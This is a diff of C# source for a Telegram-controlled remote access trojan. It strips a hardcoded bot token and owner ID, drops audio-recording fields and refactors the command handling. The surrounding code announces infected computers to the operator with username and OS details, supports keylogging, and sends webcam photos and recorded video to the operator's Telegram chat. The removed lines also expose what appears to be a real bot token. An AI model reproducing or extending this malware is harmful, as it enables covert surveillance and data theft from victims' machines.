@@ -31,15 +31,11 @@ namespace TelegramRAT
     {
         static TelegramBotClient Bot;
 
-        readonly static long? OwnerId = 1113634091; // Place your Telegram id here or keep it null.
-        readonly static string BotToken = "1727211141:AAHYjMAS6Zo7q7_kgRLUkkOj7lVjWonhikQ"; // Place your Telegram bot token. 
+        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
+        readonly static string BotToken = null; // Place your Telegram bot token. 
 
         static List<BotCommand> commands = new List<BotCommand>();
         static bool keylog = false;
-        static bool doRecord = false;
-
-        static WaveInEvent waveIn;
-        static WaveFileWriter waveFileWriter;
 
         static ScriptScope pythonScope;
         static ScriptEngine pythonEngine;
@@ -87,7 +83,7 @@ namespace TelegramRAT
 
         static async Task Run()
         {
-            await Bot.SendTextMessageAsync(OwnerId,
+            var hellomsg = await Bot.SendTextMessageAsync(OwnerId,
                 $"Computer online! \n\n" +
 
                 $"Username: <b>{Environment.UserName}</b>\n" +
@@ -95,7 +91,7 @@ namespace TelegramRAT
 
                 $"OS: {GetWindowsVersion()}",
                 ParseMode.Html);
-
+            
             var offset = 0;
 
             while (true)
@@ -104,6 +100,11 @@ namespace TelegramRAT
                 if (updates.Length != 0)
                     offset = updates.Last().Id + 1;
 
+                updates = updates.Where(update =>
+                {
+                    return update.Message != null && update.Message.Date > hellomsg.Date;
+                }).ToArray();
+                
                 UpdateWorker(updates).Wait();
 
                 Task.Delay(1000).Wait();
@@ -113,9 +114,10 @@ namespace TelegramRAT
 
         public static async Task UpdateWorker(Update[] Updates)
         {
+            
             foreach (var update in Updates)
             {
-                if (update.Message == null || (update.Message.Text == null && update.Message.Caption == null))
+                if (update.Message.Text == null && update.Message.Caption == null)
                 {
                     continue;
                 }
@@ -127,28 +129,28 @@ namespace TelegramRAT
                 if (model == null)
                     continue;
 
-                foreach (var cmd in commands)
+                var cmd = commands.Find(cmd => cmd.Command == model.Command);
+
+                if (cmd == null)
+                    continue;
+
+                if ((cmd.IgnoreCountArgs || cmd.CountArgs != 0) && model.Args.Length != 0)
                 {
-                    if (cmd.Command == model.Command)
-                    {
-                        if ((cmd.IgnoreCountArgs || cmd.CountArgs != 0) && model.Args.Length != 0)
-                        {
-                            cmd.Execute.Invoke(model, update);
-                        }
-                        else if (!(cmd.IgnoreCountArgs || cmd.CountArgs != 0) || cmd.MayHaveNoArgs)
-                        {
-                            cmd.Execute.Invoke(model, update);
-                        }
-                        else
-                        {
-                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
-                                 $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: update.Message.MessageId);
-                        }
-                        break;
-                    }
+                    cmd.Execute.Invoke(model, update);
                 }
+                else if (!(cmd.IgnoreCountArgs || cmd.CountArgs != 0) || cmd.MayHaveNoArgs)
+                {
+                    cmd.Execute.Invoke(model, update);
+                }
+                else
+                {
+                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
+                         $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: update.Message.MessageId);
+                }
+
             }
         }
+
 
 
         static string GetWindowsVersion()
@@ -158,10 +160,10 @@ namespace TelegramRAT
             {
                 string prodName = key.GetValue("ProductName") as string;
                 string csdVer = key.GetValue("CSDVersion") as string;
-
+                csdVer = "";
                 return prodName + csdVer;
             }
-            return "";
+            return string.Empty;
         }
 
         static void InitializeCommands(List<BotCommand> CommandsList)
@@ -191,31 +193,30 @@ namespace TelegramRAT
                         {
                             command = "/" + command;
                         }
-
-                        foreach (BotCommand cmd in commands)
+                        var cmd = commands.Find(cmd => cmd.Command == command);
+                        if (cmd == null)
                         {
-                            if (cmd.Command == command)
-                            {
-                                string Description = $"<b>{cmd.Command}</b>\n\n";
-                                if (cmd.Description != null)
-                                {
-                                    Description += cmd.Description;
-                                }
-                                else
-                                {
-                                    Description += "<i>No description provided</i>";
-                                }
-                                if (cmd.Example != null)
-                                {
-                                    Description += $"\nExample: {cmd.Example}";
-                                }
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, Description, replyToMessageId: update.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);
-                                return;
-                            }
-                        }
-
-                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command doesn't exist! " +
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command doesn't exist! " +
                             "To get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);
+                            return;
+                        }
+                        string Description = $"<b>{cmd.Command}</b>\n\n";
+                        if (cmd.Description != null)
+                        {
+                            Description += cmd.Description;
+                        }
+                        else
+                        {
+                            Description += "<i>No description provided</i>";
+                        }
+                        if (cmd.Example != null)
+                        {
+                            Description += $"\nExample: {cmd.Example}";
+                        }
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, Description, replyToMessageId: update.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);
+                        return;
+
+
 
                     });
                 }
@@ -614,7 +615,7 @@ namespace TelegramRAT
 
                             InputOnlineFile webcamPhoto = new InputOnlineFile(webcamShot);
                             await Bot.SendPhotoAsync(update.Message.Chat.Id, webcamPhoto);
-                            
+
                         }
                         catch (Exception ex)
                         {
@@ -749,7 +750,7 @@ namespace TelegramRAT
                                 FrameWidth = 1280,
                                 FrameHeight = 720,
                             };
-                            
+
                             Mat frame = new Mat();
                             VideoWriter vidWriter = new VideoWriter("vid.mp4", FourCC.H264, 30, new OpenCvSharp.Size(cap.FrameWidth, cap.FrameHeight));
 
